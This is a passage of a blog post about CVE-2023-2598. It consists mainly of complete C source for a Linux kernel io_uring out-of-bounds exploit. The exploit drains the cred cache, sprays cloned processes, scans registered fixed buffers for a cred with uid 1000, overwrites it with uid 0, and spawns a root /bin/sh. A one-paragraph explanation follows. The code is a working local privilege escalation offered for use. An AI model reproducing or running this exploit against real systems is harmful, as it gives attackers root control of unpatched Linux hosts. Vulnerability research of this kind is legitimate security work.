class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mqueue.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/tcp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_DRAIN 100 <span class="hljs-comment">// Wait for modifying the cred cache</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_SPRAY 2000 <span class="hljs-comment">// Number of clones to spray</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 0x1000 <span class="hljs-comment">// Size of a memory page</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PAGES 100 <span class="hljs-comment">// Maximum number of pages to allocate</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">timer</span> =</span> &#123;<br>    .tv_sec = <span class="hljs-number">1145141919</span>,<br>    .tv_nsec = <span class="hljs-number">0</span>,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COLOR_RED <span class="hljs-string">&quot;\033[1;31m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COLOR_GREEN <span class="hljs-string">&quot;\033[1;32m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COLOR_RESET <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-type">int</span> check_root_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">char</span> bin_sh_str[] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br><span class="hljs-type">char</span> child_pipe_buf[<span class="hljs-number">1</span>];<br><span class="hljs-comment">// char root_str[] = &quot;Finally get root privilege!\n&quot;;</span><br><span class="hljs-type">char</span> root_str[] = <span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root.\n&quot;</span><br>                  <span class="hljs-string">&quot;\033[34m[*] Execve root shell now...\033[0m\n&quot;</span>;<br><br><span class="hljs-type">char</span> *shell_args[] = &#123; bin_sh_str, <span class="hljs-literal">NULL</span> &#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf)</span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s[-]%s : %s%s\n&quot;</span>, COLOR_RED, buf, strerror(errno), COLOR_RESET);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">check_ret</span><span class="hljs-params">(<span class="hljs-type">int</span> ret,<span class="hljs-type">char</span>* buf)</span>&#123;<br>    <span class="hljs-keyword">if</span>(ret &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(buf);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">log_msg</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf)</span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;[+] %s\n&quot;</span>, buf);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">log_fail_msg</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf)</span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;[-] %s\n&quot;</span>, buf);<br>&#125;;<br><span class="hljs-comment">// clear the cred_cache the system have so that when we fork a subprocess, the credential will create with new buddy_memory</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">clear_cred_cache</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CRED_DRAIN; i++)&#123;<br>        <span class="hljs-type">int</span> ret = fork();<br>        <span class="hljs-keyword">if</span>(!ret)&#123;<br>            read(check_root_pipe[<span class="hljs-number">0</span>],child_pipe_buf,<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span>(getuid()==<span class="hljs-number">0</span>)&#123;<br>                write(<span class="hljs-number">1</span>, root_str, <span class="hljs-number">80</span>);<br>                system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            &#125;<br>            sleep(<span class="hljs-number">100000000</span>);<br>        &#125;<br>        check_ret(ret, <span class="hljs-string">&quot;fork fail&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//clear buddy memory that ord is 0, 1, 2..and so on.</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">clear_buddy</span><span class="hljs-params">()</span>&#123;<br>    log_msg(<span class="hljs-string">&quot;Buddy system cache cleared&quot;</span>);<br>    <span class="hljs-type">void</span>* page[MAX_PAGES];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>; i &lt; MAX_PAGES; i++)&#123;<br>        page[i] = mmap(<span class="hljs-number">0x60000000</span> + i * <span class="hljs-number">0x200000U</span>L, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_PAGES; i++)&#123;<br>        *(<span class="hljs-type">char</span> *)page[i] = <span class="hljs-string">&#x27;a&#x27;</span>; <br>    &#125;<br>&#125;<br><br>__attribute__ ((naked)) <span class="hljs-type">long</span> <span class="hljs-title function_">simple_clone</span><span class="hljs-params">(<span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> (*fn)(<span class="hljs-type">void</span> *))</span>&#123;<br>    __asm__ <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov r15, rsi\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rsi, rsi\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rdx, rdx\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor r10, r10\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor r8, r8\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor r9, r9\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 56\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span> <span class="hljs-comment">//clone()</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   cmp rax, 0\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   je child_fn\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   ret\n&quot;</span> <span class="hljs-comment">// parent</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;child_fn:\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   jmp r15\n&quot;</span> <span class="hljs-comment">// child</span></span><br><span class="hljs-params">    )</span>;<br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">wait_for_root_fn</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    <span class="hljs-comment">// Wait for root privilege</span><br>    __asm__ <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-comment">// read(check_root_pipe[0], child_pipe_buf, 1);</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rax, [check_root_pipe]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rdi, rdi\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov edi, dword ptr [rax]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rsi, child_pipe_buf\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rdx, 1\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rax, rax\n&quot;</span> <span class="hljs-comment">// read(check_root_pipe[0], child_pipe_buf, 1)</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 102\n&quot;</span> <span class="hljs-comment">//getuid()</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   cmp rax, 0\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   jne failed\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rdi, 1\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rdi, [bin_sh_str]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rsi, [shell_args]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rdx, rdx\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 59\n&quot;</span> <span class="hljs-comment">// execve(&quot;/bin/sh&quot;, args, NULL)</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;failed: \n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rdi, [timer]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rsi, rsi\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 35\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span> <span class="hljs-comment">// nanosleep(&amp;timer, NULL)</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">cpu_set_t</span> <span class="hljs-built_in">set</span>;<br>	CPU_ZERO(&amp;<span class="hljs-built_in">set</span>);<br>	CPU_SET(sched_getcpu(), &amp;<span class="hljs-built_in">set</span>);<br>	<span class="hljs-keyword">if</span> (sched_setaffinity(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">set</span>), &amp;<span class="hljs-built_in">set</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>		perror(<span class="hljs-string">&quot;sched_setaffinity&quot;</span>);<br>		<span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>	&#125;<br>    <span class="hljs-comment">// clear cred cache</span><br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// io_uring setup</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> *<span class="hljs-title">sqe</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_cqe</span> *<span class="hljs-title">cqe</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iovec</span>;</span><br>    <span class="hljs-comment">// buffer for read/write operations</span><br>    <span class="hljs-type">int</span> memfd;<br>    <span class="hljs-type">int</span> rw_fd;<br>    <span class="hljs-type">int</span> page_offset = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">uint64_t</span> start_addr = <span class="hljs-number">0x800000000</span>;<br>    <span class="hljs-type">int</span> nr_pages = <span class="hljs-number">500</span>;<br>    <span class="hljs-type">char</span>* rw_buffer;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">1000</span>];<br>    log_msg(<span class="hljs-string">&quot;Clearing cred cache&quot;</span>);<br>    pipe(check_root_pipe);<br>    clear_cred_cache();<br>    log_msg(<span class="hljs-string">&quot;Clearing buddy system cache&quot;</span>);<br>    <span class="hljs-comment">// Clear buddy system cache (implementation not shown in the original code)</span><br>    clear_buddy();<br>    log_msg(<span class="hljs-string">&quot;Setting up io_uring&quot;</span>);<br>    check_ret(io_uring_queue_init(<span class="hljs-number">8</span>, &amp;ring, <span class="hljs-number">0</span>), <span class="hljs-string">&quot;io_uring_setup failed&quot;</span>);<br>    <span class="hljs-comment">// io_uring_register_buffers(&amp;ring, iovec, 1);</span><br>    log_msg(<span class="hljs-string">&quot;Preparing buffer for registration&quot;</span>);<br>    <br><br>    <span class="hljs-comment">// Create memfd for io_uring buffer</span><br>    memfd = memfd_create(<span class="hljs-string">&quot;io_register_buf&quot;</span>, MFD_CLOEXEC);<br>    check_ret(memfd, <span class="hljs-string">&quot;memfd_create failed&quot;</span>);<br>    rw_fd = memfd_create(<span class="hljs-string">&quot;read_write_file&quot;</span>, MFD_CLOEXEC);<br>    check_ret(rw_fd, <span class="hljs-string">&quot;memfd_create failed&quot;</span>);<br>    <br>    check_ret(fallocate(memfd, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span> * PAGE_SIZE), <span class="hljs-string">&quot;memfd fallocate failed&quot;</span>);<br>    check_ret(fallocate(rw_fd, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span> * PAGE_SIZE), <span class="hljs-string">&quot;rw_fd fallocate failed&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nr_pages; i++)&#123;<br>        check_ret(mmap(start_addr + i * PAGE_SIZE, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, memfd, <span class="hljs-number">0</span>), <span class="hljs-string">&quot;mmap failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// Register buffer for io_uring</span><br>    log_msg(<span class="hljs-string">&quot;Registering buffer for io_uring&quot;</span>);<br>    iovec.iov_base = start_addr;<br>    iovec.iov_len = nr_pages * PAGE_SIZE;<br>    rw_buffer = mmap(<span class="hljs-literal">NULL</span>, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, rw_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (rw_buffer == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;mmap rw_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    check_ret(io_uring_register_buffers(&amp;ring, &amp;iovec, <span class="hljs-number">1</span>), <span class="hljs-string">&quot;io_uring_register_buffers failed&quot;</span>);<br>    <span class="hljs-comment">// spred cred</span><br>    log_msg(<span class="hljs-string">&quot;Spraying credentials&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CRED_SPRAY; i++)&#123;<br>        <span class="hljs-comment">// check_ret(simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_THREAD | CLONE_SIGHAND, wait_for_root_fn), &quot;clone failed&quot;);</span><br>        check_ret(simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, wait_for_root_fn), <span class="hljs-string">&quot;clone failed&quot;</span>);<br>    &#125;<br><br>    log_msg(<span class="hljs-string">&quot;Searching for cred that we sprayed&quot;</span>);<br>    <span class="hljs-comment">// Search for the sprayed credentials</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nr_pages; i++)&#123;<br>        sqe = io_uring_get_sqe(&amp;ring);<br>        <span class="hljs-keyword">if</span> (sqe == <span class="hljs-literal">NULL</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;io_uring_get_sqe failed&quot;</span>);<br>        &#125;<br>        io_uring_prep_write_fixed(sqe, rw_fd, start_addr + i*PAGE_SIZE, PAGE_SIZE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        check_ret(io_uring_submit(&amp;ring), <span class="hljs-string">&quot;io_uring_submit failed&quot;</span>);<br>        io_uring_wait_cqe(&amp;ring, &amp;cqe);<br>        io_uring_cqe_seen(&amp;ring, cqe);<br>        <span class="hljs-type">int</span> uid = ((<span class="hljs-type">int</span> *)(rw_buffer))[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span> gid = ((<span class="hljs-type">int</span> *)(rw_buffer))[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span>(uid == <span class="hljs-number">1000</span> &amp;&amp; gid == <span class="hljs-number">1000</span>)&#123;<br>            log_msg(<span class="hljs-string">&quot;Found the target cred page&quot;</span>);<br>            page_offset = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(page_offset &lt; <span class="hljs-number">0</span>)&#123;<br>        log_fail_msg(<span class="hljs-string">&quot;Not find cred page&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    log_msg(<span class="hljs-string">&quot;Editing cred&#x27;s uid to 0&quot;</span>);<br>    <span class="hljs-type">uint32_t</span>* cred = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)rw_buffer;<br>    <span class="hljs-comment">// cred[0] = 0x2; // Keep usage unchanged</span><br>    cred[<span class="hljs-number">1</span>] = <span class="hljs-number">0x0</span>; <span class="hljs-comment">// Set uid to 0</span><br>    cred[<span class="hljs-number">2</span>] = <span class="hljs-number">0x0</span>;<br>    cred[<span class="hljs-number">3</span>] = <span class="hljs-number">0x0</span>; <span class="hljs-comment">// Set suid and sgid to 0</span><br>    cred[<span class="hljs-number">4</span>] = <span class="hljs-number">0x0</span>; <br>    cred[<span class="hljs-number">5</span>] = <span class="hljs-number">0x0</span>; <br>    cred[<span class="hljs-number">6</span>] = <span class="hljs-number">0x0</span>; <br><br>    sqe = io_uring_get_sqe(&amp;ring);<br>    <span class="hljs-keyword">if</span>(sqe == <span class="hljs-literal">NULL</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;io_uring_get_sqe failed&quot;</span>);<br>    &#125;<br>    io_uring_prep_read_fixed(sqe, rw_fd, start_addr + page_offset * PAGE_SIZE, <span class="hljs-number">28</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    check_ret(io_uring_submit(&amp;ring), <span class="hljs-string">&quot;io_uring_submit failed&quot;</span>);<br>    io_uring_wait_cqe(&amp;ring, &amp;cqe);<br>    io_uring_cqe_seen(&amp;ring, cqe);<br><br>    log_msg(<span class="hljs-string">&quot;check privilege in child processes&quot;</span>);<br>    write(check_root_pipe[<span class="hljs-number">1</span>],buf, CRED_SPRAY+CRED_DRAIN);<br>    sleep(<span class="hljs-number">100000000</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>The main principle of the above exploit is to exhaust the credentials of the process and occupy as much buddy_memory as possible, so that when we spray the process (credential), the target can be within 500 consecutive pages. In this way, we can find the sprinkled credentials within 500 pages and generate a root shell.</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
      
        <a href="/tags/io-uring/" class="print-no-link">#io_uring</a>
      
        <a href="/tags/EXP/" class="print-no-link">#EXP</a>
      
        <a href="/tags/CVE/" class="print-no-link">#CVE</a>
      
        <a href="/tags/OOB/" class="print-no-link">#OOB</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2023-2598</div>
      <div>http://spongebob-369.github.io/2025/08/20/CVE-2023-2598/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>SpongeBob</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>August 20, 2025</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/08/29/CVE-2024-0582/" title="CVE-2024-0582">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CVE-2024-0582</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/07/21/CVE-2025-32462/" title="CVE-2025-32462">
                        <span class="hidden-mobile">CVE-2025-32462</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
